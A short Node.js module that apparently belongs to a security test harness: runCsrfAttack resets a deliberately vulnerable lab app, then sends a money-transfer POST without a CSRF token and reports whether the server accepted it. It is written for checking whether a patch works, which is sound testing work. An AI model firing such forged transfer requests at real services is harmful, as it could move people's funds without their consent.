const axios = require('axios');

// CSRF: POST /transfer without any CSRF token. The vulnerable app accepts the
// transfer because it never checks the request's origin. A patched server
// should issue a token via GET /csrf-token and reject transfers that don't
// present it (403).
async function runCsrfAttack({ baseUrl }) {
  const start = Date.now();
  const tried = [];

  try {
    // best-effort reset so the balance is predictable across runs
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}

    const res = await axios.post(
      `${baseUrl}/transfer`,
      { to: 'user-2', amount: 1000 },
      {
        headers: {
          'Content-Type': 'application/json',
          // explicitly do NOT send X-CSRF-Token
        },
        timeout: 5000,
        validateStatus: () => true,
      },
    );

    if (res.status === 200 && res.data && res.data.success === true) {
      return {
        vulnerability: 'csrf',
        exploited: true,
        payload: 'POST /transfer {to:"user-2",amount:1000} (no CSRF token)',
        evidence: `Server accepted the cross-origin transfer: newBalance=${res.data.newBalance}`,
        durationMs: Date.now() - start,
      };
    }

    tried.push(`POST /transfer without token: ${res.status} — ${JSON.stringify(res.data).slice(0, 120)}`);
  } catch (err) {
    tried.push(`POST /transfer without token: ${err.message}`);
  }

  return {
    vulnerability: 'csrf',
    exploited: false,
    payload: null,
    evidence: tried.join('; ').slice(0, 200),
    durationMs: Date.now() - start,
  };
}

module.exports = { runCsrfAttack };
